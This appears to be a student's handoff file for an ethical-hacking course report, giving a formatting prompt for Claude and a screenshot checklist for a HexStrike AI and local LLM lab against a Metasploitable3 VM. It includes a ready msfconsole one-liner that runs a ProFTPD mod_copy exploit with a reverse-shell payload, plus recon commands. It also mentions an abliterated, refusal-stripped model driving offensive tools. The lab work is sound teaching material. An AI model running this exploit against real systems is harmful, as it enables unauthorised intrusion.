# Report Handoff — AI Security Orchestrator (HexStrike AI + Local LLM)

Use this file to hand the report off to Claude (claude.ai) for final formatting and screenshot
insertion. It contains: (1) which files to upload, (2) the exact prompt to paste, (3) the full
screenshot checklist with the commands to capture each, and (4) where each screenshot goes.

---

## 1. Files to upload to Claude

- `assignment-report.md` (or `assignment-report.docx`) — the report draft.
- `EthicalHackingAssignment_HexStrike.pdf` — the official assignment (the requirements).
- `megacorpone-recon.txt` — reconnaissance evidence.
- All screenshots from section 3 below, named exactly as shown (A1 … E2).

---

## 2. Prompt to paste into Claude (keep in English)

```
You are helping me finalize an academic report for my university course "Ethical Hacking"
(Saint Joseph University, Master in Cybersecurity, INCI, Semester 3).

Attached:
- assignment-report.md : a complete draft, already structured to the exact required headers.
- EthicalHackingAssignment_HexStrike.pdf : the official assignment (the requirements).
- megacorpone-recon.txt : real reconnaissance output (evidence).
- ~26 screenshots (real evidence from my lab), named A1 … E2 (see the mapping below).

Your tasks:
1. Produce a polished, submission-ready Microsoft Word (.docx) version of the report.
2. Insert EVERY screenshot as a figure at the matching place. The professor requires a
   screenshot for every step, so each item in the mapping below must appear as a numbered
   figure with a short italic caption (e.g. "Figure 5 — HexStrike /health, version 6.0.0").
   The draft marks figure slots with `[SCREENSHOT: …]`, `[LOG: …]`, `[INSERT …]`; use the
   mapping to decide which file goes where, and add figures even where a marker is missing
   if that step logically needs one.
3. Replace `[YOUR NAME]` with: <PUT YOUR NAME HERE>.
4. Improve wording, flow and academic tone, but DO NOT invent or change any technical fact
   (versions, IPs, CVEs, commands, results) — these are real and must stay exact. Do not add
   evidence that isn't in the attachments. Keep the "beyond base requirement" labelling on the
   incident-management-platform parts.
5. Keep all required sections, the Technical Appendix, and the one-page Risks & Safeguards sheet.
6. Remove leftover placeholder lines once the real figure is in. If a screenshot is missing,
   leave a visible "[MISSING: <name>]" note instead of inventing anything.
7. Ask me before finalizing if any placement is ambiguous. Output the final .docx.

Screenshot → placement mapping:
  A1 install (dpkg/ls/which) ............... §3.1 Installation
  A2 hexstrike_server startup banner ....... §3.1 Installation
  A3 /health (version 6.0.0, healthy) ...... §1.2 / §3.1 + Appendix
  A4 tool count (82/127) ................... §1.2 Observed architecture
  B1 ollama --version ...................... §3.2 Installation
  B2 ollama list (model pulled) ............ §2.1 / §3.2
  B3 "LOCAL MODEL READY" ................... §2 / §3.2
  B4 /api/tags (Q4_K_M, 14.8B, tools) ...... §2.1 Spec sheet + Appendix (model parameters)
  B5 loopback (ss -ltnp 8888/11434) ........ §2.2 Confidentiality / §4 (no cloud)
  B6 response-time trials (seconds) ........ §2.3 Response-time measurements
  C1 hexstrike_mcp connectivity banner ..... §4 Evidence of Connectivity + Appendix
  C2 AI agent orchestration run ............ §4 + §5.2/§5.3 + Appendix (connectivity logs)
  C3 architecture diagram .................. §1.1 Architecture + Appendix
  T1 Metasploitable3 VM powered on ......... §1.1 Topology / §5 Scenarios
  T2 target reachable (ping/ip neigh) ...... §5 Scenarios
  T3 nmap of the target (services) ......... §5.2 Scanning
  T4 Kali lab network (ip -br a) ........... §1.1 Topology (optional)
  D1 megacorpone whois ..................... §5.1 Reconnaissance
  D2 megacorpone DNS records ............... §5.1 Reconnaissance
  D3 megacorpone AXFR refused .............. §5.1 Reconnaissance
  D4 megacorpone subdomains ................ §5.1 Reconnaissance
  D5 Metasploitable scan (services) ........ §5.2 Scanning
  D6 vulnerability identified (CVE-2017-7494) §5.3 Vulnerability testing
  D7 Metasploit exploit — shell opened ..... §5.4 Exploitation
  D8 proof of access (id=www-data, uname) .. §5.4 Exploitation
  E1 in-app AI Orchestrator panel (bonus) .. §1.3 (bonus)
  E2 in-app run + Stop + audit (bonus) ..... §1.3 (bonus)
```

---

## 3. Screenshot checklist (capture these; name the file exactly)

> All commands run on **Kali** unless noted. Capture the terminal window (or the app/VMware window).

### Part A — HexStrike installation & validation
| File | What it shows | Command / screen |
|---|---|---|
| `A1` | package installed | `dpkg -l hexstrike-ai; ls /usr/share/hexstrike-ai; which hexstrike_server hexstrike_mcp` |
| `A2` | server starts (banner, version, command timeout) | `hexstrike_server` — capture the first screen |
| `A3` | operational `/health` | `curl -s http://127.0.0.1:8888/health \| python3 -m json.tool \| head -40` |
| `A4` | tool count & version | `curl -s http://127.0.0.1:8888/health \| python3 -c "import sys,json;d=json.load(sys.stdin);print('tools',d['total_tools_available'],'/',d['total_tools_count'],'version',d['version'])"` |

### Part B — Local LLM
| File | What it shows | Command / screen |
|---|---|---|
| `B1` | Ollama version | `ollama --version` |
| `B2` | model pulled | `ollama list` |
| `B3` | responds locally | `ollama run huihui_ai/qwen2.5-abliterate:14b "Reply with exactly: LOCAL MODEL READY"` |
| `B4` | model parameters | `curl -s http://127.0.0.1:11434/api/tags \| python3 -m json.tool` |
| `B5` | requests stay local (loopback) | `ss -ltnp \| grep -E '8888\|11434'` |
| `B6` | response-time, 3 trials | run a tool-call/analysis 3× and capture the seconds (or use the app's transcript "decided in Xs") |

### Part C — Connecting the LLM to HexStrike
| File | What it shows | Command / screen |
|---|---|---|
| `C1` | mcp ⇄ server connectivity | `hexstrike_mcp --server http://127.0.0.1:8888` — capture "Successfully connected … healthy … Version 6.0.0 … 150 tools" |
| `C2` | the model driving HexStrike (no cloud) | `python3 ~/hexstrike_agent.py "scan common ports on 192.168.50.11" 3` or `cat /tmp/hexstrike_agent_*.log` |
| `C3` | architecture diagram | draw it (draw.io / PowerPoint) from the ASCII diagram in the report |

### Lab / target setup (Metasploitable 3)
| File | What it shows | Command / screen |
|---|---|---|
| `T1` | the VM is powered on | VMware — capture the Metasploitable3 VM running |
| `T2` | target reachable & live | `ping -c 3 192.168.50.11; ip neigh show 192.168.50.11` (REACHABLE + VMware MAC `00:0c:29:…`) |
| `T3` | target open services | `nmap -Pn -sV -p 21,22,80,445,3306 192.168.50.11` |
| `T4` | Kali lab network (optional) | `ip -br a` (eth0 = `192.168.50.2`) |

### Part D — Evaluation scenarios
| File | What it shows | Command / screen |
|---|---|---|
| `D1` | megacorpone whois | `whois megacorpone.com \| head -30` |
| `D2` | megacorpone DNS | `for r in SOA NS MX A TXT; do host -t $r megacorpone.com; done` |
| `D3` | AXFR refused | `dig +time=5 AXFR megacorpone.com @ns1.megacorpone.com` |
| `D4` | subdomains | `cat /tmp/megacorpone_recon.txt` (Subdomain enumeration section) |
| `D5` | Metasploitable scan | from the agent log (nmap: ProFTPD/SSH/Apache/Samba/MySQL) or `cat /tmp/hexstrike_agent_*.log` |
| `D6` | vulnerability identified | same log — the model's conclusion: Samba **CVE-2017-7494** |
| `D7` | exploitation — shell opened | run the ProFTPD exploit in msfconsole; capture "Command shell session opened" |
| `D8` | proof of access | in the shell: `id` (uid=33 www-data) + `uname -a` |

Exploitation command (for `D7`/`D8`):
```
msfconsole -q -x "use exploit/unix/ftp/proftpd_modcopy_exec; set RHOSTS 192.168.50.11; set RPORT 80; set SSL false; set SITEPATH /var/www/html; set payload cmd/unix/reverse_perl; set LHOST 192.168.50.2; set LPORT 4444; run"
```
(then type `id` and `uname -a` in the opened shell)

### Bonus — governed platform (label as "beyond base requirement")
| File | What it shows | Where |
|---|---|---|
| `E1` | in-app AI Orchestrator panel | browser → app → Assessments |
| `E2` | a run with transcript + Stop | browser → app (run + Stop button) |

---

## 4. Notes
- Keep every version/IP/CVE/command exactly as captured — they are real evidence.
- Name files exactly `A1 … E2` so Claude places them correctly.
- If a screenshot can't be taken, tell Claude to leave a visible `[MISSING: …]` note (never invent).
